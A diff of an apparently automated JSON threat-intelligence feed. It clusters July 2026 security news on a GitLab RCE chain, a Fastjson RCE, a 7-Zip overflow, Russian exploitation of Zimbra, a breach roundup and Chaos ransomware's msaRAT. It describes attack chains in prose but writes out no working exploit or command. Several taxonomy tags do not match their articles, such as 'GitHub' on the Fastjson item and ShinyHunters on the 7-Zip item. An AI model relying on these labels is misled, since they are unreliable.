those installs have to move to a supported release instead. Commands run as git , the account behind Puma. How far that goes depends on how the install is isolated. In reach: source code, Rails secrets, service credentials, CI/CD data, and internal services the application can talk to. The public exploit is built for GitLab 18.11.3 on x86-64. Gadget offsets, register state, and jemalloc behavior all came from that image, and a recovered library base holds only until the Puma master restarts, so this is not drop-in against an arbitrary target. The Oj bugs are general; porting the exploit is real work. depthfirst measured five to ten minutes for the memory search on a fresh two-worker install and projects one to two hours on longer-running ones. Its writeup has the full chain. depthfirst reported the Oj bugs on May 21, the maintainer merged fixes on May 27, and Oj 3.17.3 shipped June 4. The GitLab chain went to GitLab on June 5, was confirmed on June 8, and was patched on June 10. depthfirst says it is not aware of in-the-wild exploitation, and that GitLab reproduced the RCE independently. Its wider Oj review produced nine more CVE advisories, none of them this chain. The Hacker News has asked GitLab why the fix was not classified as a security issue and whether a CVE will be assigned, and asked depthfirst about exploit portability. Responses are pending. Found th",
+        "title": "Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available",
+        "link": "https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html",
+        "published": "2026-07-25T12:52:43+00:00",
+        "summary": "Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723, the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires",
+        "full_body": "Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available  Swati Khandelwal  Jul 25, 2026 Vulnerability / Application Security Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723 , the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires Fastjson 1.2.68 through 1.2.83, a Spring Boot executable fat-JAR, a network-reachable path that sends attacker-controlled JSON to an affected parser, and SafeMode left at its disabled default. AutoType can remain disabled, and no classpath gadget is required. As of July 25, Alibaba had not released a fixed Fastjson 1.x version. Organizations that cannot migrate immediately should enable SafeMode with -Dfastjson.parser.safeMode=true or use com.alibaba:fastjson:1.2.83_noneautotype . Alibaba lists migration to Fastjson2 as the long-term fix. Alibaba published its advisory on July 21 following responsible disclosure by Kirill Firsov of FearsOff Cybersecurity. The maintainers described the vulnerability as requiring \"no AutoType enablement\" and \"no classpath gadget.\" They verified the chain on Spring Boot 2.x, 3.x, and 4.x with JDK 8, 11, 17, and 21. Firsov traced the issue to Fastjson's type-resolution path. An attacker-controlled @type value can be turned into a class-resource lookup. In a compatible Spring Boot fat-JAR, a crafted nested JAR path can fetch attacker-controlled bytecode. An @JSONType annotation in that resource can then be treated as a trust signal, allowing the class to pass Fastjson's type checks and load. His technical analysis also describes a newer-JDK path that downloads a remote JAR and references it through /proc/self/fd . The exploit depends on the Spring Boot executable fat-JAR loader. Alibaba lists plain non-fat JARs, generic uber-JARs, and Tomcat or Jetty WAR deployments as unaffected. Reachable entry points include JSON.parse , JSON.parseObject(String) , and JSON.parseObject(String, Class) . Binding input to a fixed class is not sufficient when an object contains an Object or Map field where the payload can be nested. ThreatBook said on July 22 that its platform had captured in-the-wild exploitation after adding detection support two days earlier. Its laboratory results were narrower: it reproduced full code execution in a Spring Boot fat-JAR on JDK 8, while its embedded Tomcat test produced only a remote JAR fetch or server-side request forgery. Imperva reported activity against financial services, healthcare, computing, retail, and other organizations, primarily in the United States, with smaller volumes in Singapore and Canada. It said browser impersonators generated most requests, while Ruby and Go tools represented about 30% collectively. Neither vendor published attack counts, raw requests, execution evidence, named victims, or confirmed compromises. Their reports establish observed exploit activity, not proof of successful code execution against a real-world target or a breach. A July 23 CISA-ADP assessment nevertheless marked exploitation as none . The Hacker News confirmed on July 25 that the flaw was absent from CISA's current Known Exploited Vulnerabilities catalog . The available sources do not explain the mismatch. The Hacker News also found no patched Fastjson 1.x artifact in the project's GitHub tags or Maven Central repository as of July 25. Version 1.2.83 remains the latest standard 1.x release, while 1.2.83_noneautotype remains the available restricted build. Organizations should inventory direct and transitive Fastjson dependencies and inspect affected systems for suspicious @type values, nested JAR URLs, unexpected outbound connections, child processes, file changes, and web shells. Fastjson2 is not affected because it does not use the same resource-",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
             "active_exploitation"
           ],
           "actor_attribution": [],
-          "affected_industries": [],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "retail_ecommerce"
+          ],
           "affected_products": [
-            "GitLab"
+            "GitHub"
           ],
           "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "no_patch_yet",
-            "poc_available"
+          "cve_ids": [
+            "CVE-2026-16723"
           ],
-          "content_type": "news_report",
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
           "confidence_tier": "tier_4_news",
           "role_map": {
-            "GitLab": "target"
+            "GitHub": "target"
           },
           "weak_tags": {
             "products": []
@@ -2311,30 +2492,33 @@
         {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
-          "title": "Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git",
-          "link": "https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html",
-          "published": "2026-07-25T08:34:15+00:00",
-          "summary": "Security researcher Yuhang Wu at depthfirst has published a working proof-of-concept (PoC) exploit that executes commands as git on an unpatched self-managed GitLab 18.11.3 server. An ordinary authenticated user triggers it by committing two crafted Jupyter notebooks and requesting their diff. The chain needs no administrator rights, continuous integration (CI) runner access, victim interaction",
+          "title": "Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available",
+          "link": "https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html",
+          "published": "2026-07-25T12:52:43+00:00",
+          "summary": "Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723, the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires",
           "taxonomy": {
             "threat_categories": [
               "active_exploitation"
             ],
             "actor_attribution": [],
-            "affected_industries": [],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "retail_ecommerce"
+            ],
             "affected_products": [
-              "GitLab"
+              "GitHub"
             ],
             "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "no_patch_yet",
-              "poc_available"
+            "cve_ids": [
+              "CVE-2026-16723"
             ],
-            "content_type": "news_report",
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
             "confidence_tier": "tier_4_news",
             "role_map": {
-              "GitLab": "target"
+              "GitHub": "target"
             },
             "weak_tags": {
               "products": []
@@ -2945,141 +3129,6 @@
               "Microsoft 365": "target",
               "Anthropic/Claude": "target",
               "Microsoft Defender": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "629e6024b5",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "CVE-2026-14266"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation",
-          "phishing_social_eng",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [],
-        "affected_products": [
-          "Microsoft 365",
-          "Microsoft Entra",
-          "Salesforce"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-14266",
-          "CVE-2026-48095"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited",
-          "zero_day"
-        ],
-        "content_type": [
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction",
-        "link": "https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html",
-        "published": "2026-07-20T09:10:56+00:00",
-        "summary": "Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker \"execute code in the context of the current process,\" per the",
-        "full_body": "New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction  Swati Khandelwal  Jul 20, 2026 Vulnerability / Endpoint Security Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266 , is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02 . The overflow lets an attacker \"execute code in the context of the current process,\" per the advisory. The code runs with the token 7-Zip itself holds and gains no privileges of its own. On Windows, a normally launched 7-Zip runs under a filtered standard-user token even on an administrator account, so the attacker inherits those limited rights unless the program was started elevated. The bug came in from Landon Peng of Lunbun LLC, who reported it to 7-Zip on June 5. ZDI rates the flaw 7.0, or High, not the Critical several write-ups reached for. The full CVSS 3.0 vector is AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H . The AV:L makes it a local attack vector, not a network-reachable or no-click one. ZDI's \"remote code execution\" describes a remote attacker delivering the file, which the victim still has to open, whether it arrives by email, a download, or a web page that hands it to 7-Zip. The high attack complexity makes reliable exploitation harder still. As of July 20, 2026, The Hacker News found no public proof-of-concept for the bug and no credible report of exploitation in the wild. The Hacker News compared the XZ decoder source across releases. The fix lands in one function, MixCoder_Code in C/XzDec.c . When an XZ stream runs its output through a filter, the decoder was handed the full output-buffer length on each pass instead of the space left after earlier writes. That gave it more room to work with than the buffer held, the out-of-bounds write condition ZDI describes. Version 26.02 subtracts the bytes already written and bails out if that running total ever exceeds the buffer. The same flawed length handling appears unchanged in 7-Zip source back to at least version 21.07 (2021), though neither ZDI nor 7-Zip has said which releases are actually exploitable. CVE-2026-14266 is the latest in a run of memory-safety bugs in 7-Zip's archive handlers. On April 27, version 26.01 fixed a batch of them , including the higher-scored CVE-2026-48095 , an NTFS-handler heap-write overflow that GitHub Security Lab detailed on May 22 with a working proof-of-concept. The XZ flaw is the quieter of the two so far, and 26.02 rolls up every one of these fixes, so one update covers them all. So update to 7-Zip 26.02 or later on every machine that opens archives from outside. Updating is a manual install from the official site, so set-and-forget machines will not pick it up on their own. Any product that ships a vulnerable copy of 7-Zip's XZ decoder needs its own vendor fix. The patch went out 20 days before the advisory, so anyone who updated in late June was covered before the details were public. For once, updating gets you ahead of the problem instead of chasing it. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Code Execution , endpoint security , Patch Management , Software Security , Vulnerability , Windows ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Micr",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "zero_day",
-            "active_exploitation"
-          ],
-          "actor_attribution": [
-            "ShinyHunters"
-          ],
-          "affected_industries": [],
-          "affected_products": [
-            "Salesforce",
-            "Microsoft Entra",
-            "Microsoft 365"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-14266",
-            "CVE-2026-48095"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited",
-            "zero_day"
-          ],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Salesforce": "target",
-            "Microsoft Entra": "target",
-            "Microsoft 365": "target",
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction",
-          "link": "https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html",
-          "published": "2026-07-20T09:10:56+00:00",
-          "summary": "Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker \"execute code in the context of the current process,\" per the",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "zero_day",
-              "active_exploitation"
-            ],
-            "actor_attribution": [
-              "ShinyHunters"
-            ],
-            "affected_industries": [],
-            "affected_products": [
-              "Salesforce",
-              "Microsoft Entra",
-              "Microsoft 365"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-14266",
-              "CVE-2026-48095"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited",
-              "zero_day"
-            ],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Salesforce": "target",
-              "Microsoft Entra": "target",
-              "Microsoft 365": "target",
-              "GitHub": "target"
             },
             "weak_tags": {
               "products": []
@@ -3706,127 +3755,6 @@
       ]
     },
     {
-      "cluster_id": "abfdfb7a02",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "education",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "Docker"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2025-66376"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Help Net Security",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Russian hackers exploit unpatched Zimbra servers to steal emails",
-        "link": "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
-        "published": "2026-07-24T12:09:44+00:00",
-        "summary": "Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s … More → The post Russian hackers exploit unpatched Zimbra servers to steal emails appeared first on Help Net Security .",
-        "full_body": "Sinisa Markovic , Managing Editor, Help Net Security July 24, 2026 Share Russian hackers exploit unpatched Zimbra servers to steal emails Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s targeting is almost certainly to gather sensitive information for the Russian Federation, with these actors primarily focusing on the covert acquisition of email data,” according to the joint security alert. Victims span the defense industrial base, federal and local government, education, energy, law enforcement, media, non-government organizations, and technology. Laundry Bear was first identified in May 2025, after Dutch intelligence traced a breach at the Dutch National Police back to a group stealing session cookies to get into police employee accounts. Attackers weaponize Zimbra XSS vulnerability The attackers’ latest campaign targets CVE-2025-66376, a cross-site scripting (XSS) vulnerability in the Zimbra web-based email and collaboration suite that was patched in November 2025. The advisory notes the group kept using the exploit even after the fix came out, meaning unpatched servers stay exposed. The flaw allows JavaScript embedded in a specially crafted HTML email to execute when the message is viewed, enabling attackers to steal account data without requiring the victim to click a link or visit a phishing page. “Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service,” reads the advisory. CISA says Laundry Bear’s exploit is used to collect victims’ last 90 days of email, email addresses and passwords, the organization’s email directory (including the Global Address List), two-factor authentication tokens, and newly created application passcodes. “The collected data is almost certainly further exfiltrated to internal network resources for review and long-term retention,” the agencies added. Cloud servers and VPNs conceal attacker activity Stolen data lands on a backend the advisory calls Flowerbed, a set of Docker containers running on rented cloud servers. One container, “Catcher,” acts as both a DNS and HTTP server to receive the stolen data. Another handles Let’s Encrypt certificates so the traffic looks like ordinary encrypted web traffic. The group leans on Mullvad VPN when logging into these servers and swaps out its infrastructure every 7 to 60 days, which makes long-term tracking harder. “The simplistic Flowerbed codebase has indications that artificial intelligence (AI) played a role in its development,” the advisory notes. What organizations should do To mitigate the risk, organizations are recommended to update their Zimbra deployments to the latest available versions, review the published IOCs, and check for connections to the identified domains and IP addresses. They should also watch authentication activity for anomalies, revoke unauthorized application passcodes, particularly ones created under the “ZimbraWeb” name, and check accounts for unauthorized mailbox access. “While Application Passcodes have non-malicious purposes, in this case instances of these passcodes with the name “ZimbraWeb” are almost certainly malicious,” the advisory warns . More about CISA CVE cyber espionage government phishing Russian Federation Share",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "apt_espionage"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government",
-            "critical_infrastructure",
-            "manufacturing_industrial",
-            "education"
-          ],
-          "affected_products": [
-            "Docker"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2025-66376"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "no_patch_yet"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Docker": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Help Net Security",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Russian hackers exploit unpatched Zimbra servers to steal emails",
-          "link": "https://www.helpnetsecurity.com/2026/07/24/laundry-bear-zimbra-vulnerability-cve-2025-66376/",
-          "published": "2026-07-24T12:09:44+00:00",
-          "summary": "Russian state-backed hacker group Laundry Bear has been breaking into government and commercial networks for at least a year by exploiting a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform. Laundry Bear (also known as Void Blizzard, CL-STA-1114, and TA488) has been running the campaign since July 2025, according to a joint advisory from the NSA, FBI, CISA, and cybersecurity agencies from the Netherlands, UK, Australia, Canada, and a dozen other countries. “Laundry Bear’s … More → The post Russian hackers exploit unpatched Zimbra servers to steal emails appeared first on Help Net Security .",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "apt_espionage"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government",
-              "critical_infrastructure",
-              "manufacturing_industrial",
-              "education"
-            ],
-            "affected_products": [
-              "Docker"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2025-66376"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "no_patch_yet"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Docker": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "332f35118d",
       "priority_score": 11,
       "member_count": 1,
@@ -4353,252 +4281,6 @@
       ]
     },
     {
-      "cluster_id": "2bab6cab95",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "ransomware_extortion",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "government",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [
-          "Anthropic/Claude",
-          "Microsoft SharePoint",
-          "WordPress"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-15409",
-          "CVE-2026-56155",
-          "CVE-2026-56164",
-          "CVE-2026-60137",
-          "CVE-2026-63030"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Check Point Research",
-        "cohort": "threat_research_primary",
-        "title": "20th July – Threat Intelligence Report",
-        "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
-        "published": "2026-07-20T12:18:41+00:00",
-        "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
-        "full_body": "FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 20th July – Threat Intelligence Report July 20, 2026 https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, employee details, and other sensitive information submitted while requesting technical assistance. Jscrambler, a JavaScript code-protection package with more than 15,000 weekly downloads, has experienced a supply chain compromise after stolen npm publishing credentials distributed malicious releases. The packages deployed malware targeting developers’, cloud, browser, cryptocurrency, and messaging credentials. Jscrambler removed the affected versions. Coca-Cola’s US dairy subsidiary Fairlife has confirmed a ransomware attack that temporarily halted production across the United States. Attackers accessed systems supporting manufacturing operations, prompting the company to activate incident response and business continuity procedures. Coca-Cola has not confirmed whether data was exfiltrated in the attack. Nihon Kotsu, Japan’s largest taxi operator, has suffered a malware attack following unauthorized access to its internal network. The company shut down affected systems, disrupting taxi dispatches, telephone services, bookings, reservations, and car rentals from July 11. No theft of customer or corporate information has been confirmed. AI THREATS Researchers identified a China-linked campaign that used Claude Code and DeepSeek to automate attacks against government and financial organizations. The tools generated scripts, adapted failed exploits, created credential-harvesting pages, and executed commands. Confirmed compromises affected government systems in Thailand and Afghanistan and organizations in Taiwan. Researchers found that xAI’s Grok Build coding assistant could upload entire Git repositories while processing debugging requests. Transferred information included unopened files and complete commit histories, potentially exposing API keys, credentials, and proprietary source code. Initial privacy controls did not prevent uploads until a server-side restriction was introduced. Researchers verified a weakness in Anthropic’s Claude for Chrome extension that allowed malicious browser extensions to impersonate Claude and act through authenticated user sessions. Successful exploitation could expose Gmail, Google Drive, or GitHub information through Claude’s permissions. Anthropic released fixes, although researchers reported that a bypass remained possible. VULNERABILITIES AND PATCHES Microsoft released patches for 622 vulnerabilities in July’s Patch Tuesday, the largest monthly release recorded by the company. Two vulnerabilities were under active exploitation, including CVE-2026-56164 in SharePoint Server and CVE-2026-56155 in Active Directory Federation Services. Both vulnerabilities could allow attackers to elevate privileges. Check Point IPS provides protection against these threats (Microsoft SharePoint Authentication Bypass (CVE-2026-56164)) WordPress has issued emergency updates for CVE-2026-63030 and CVE-2026-60137, collectively called wp2shell. The critical WordPress Core vulnerabilities allow unauthenticated remote code execution and website takeover. Affected releases include versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1. Fixed versions include 6.9.5 and 7.0.2. Check Point IPS provides protection against these threats (WordPress Authentication Bypass (CVE-2026-63030)), WordPress SQL Injection (CVE-2026-60137)) SonicWall has released a hotfix for CVE-2026-15409 and CVE-2026-15410, two critical vulnerabilities affecting SMA 1000 Series gat",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain",
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "government",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [
-            "Anthropic/Claude",
-            "Microsoft SharePoint",
-            "WordPress"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-56164",
-            "CVE-2026-56155",
-            "CVE-2026-63030",
-            "CVE-2026-60137",
-            "CVE-2026-15409"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "preauth_unauth"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Anthropic/Claude": "target",
-            "Microsoft SharePoint": "target",
-            "WordPress": "target",
-            "SonicWall": "target",
-            "npm": "target",
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Check Point Research",
-          "cohort": "threat_research_primary",
-          "title": "20th July – Threat Intelligence Report",
-          "link": "https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/",
-          "published": "2026-07-20T12:18:41+00:00",
-          "summary": "For the latest discoveries in cyber research for the week of 20th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Ernst & Young, a global accounting and professional services company, has disclosed a data breach involving a compromised third-party IT support platform. The exposed support tickets may have contained client documents, tax information, […] The post 20th July – Threat Intelligence Report appeared first on Check Point Research .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain",
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "government",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [
-              "Anthropic/Claude",
-              "Microsoft SharePoint",
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-56164",
-              "CVE-2026-56155",
-              "CVE-2026-63030",
-              "CVE-2026-60137",
-              "CVE-2026-15409"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Anthropic/Claude": "target",
-              "Microsoft SharePoint": "target",
-              "WordPress": "target",
-              "SonicWall": "target",
-              "npm": "target",
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "a1940e8772",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Cisco"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Cisco Talos",
-        "cohort": "threat_research_primary",
-        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
-        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
-        "published": "2026-07-23T10:00:38+00:00",
-        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
-        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs 